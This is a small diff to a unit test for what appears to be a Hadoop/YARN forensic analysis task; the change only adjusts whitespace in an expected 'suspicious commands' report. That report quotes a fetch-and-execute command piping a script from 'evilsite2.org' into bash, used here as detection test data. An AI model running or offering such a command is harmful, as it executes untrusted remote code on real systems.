@@ -27,7 +27,7 @@ class HadoopAnalysisTest(unittest.TestCase):
   """Tests for HadoopAnalysisTask."""
 
   _EXPECTED_REPORT = """Found suspicious commands!
-	File: /../../test_data/bad_yarn_saved_task
+File: /../../test_data/bad_yarn_saved_task
 Command: "1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0"
 
 All strings from Yarn Tasks:
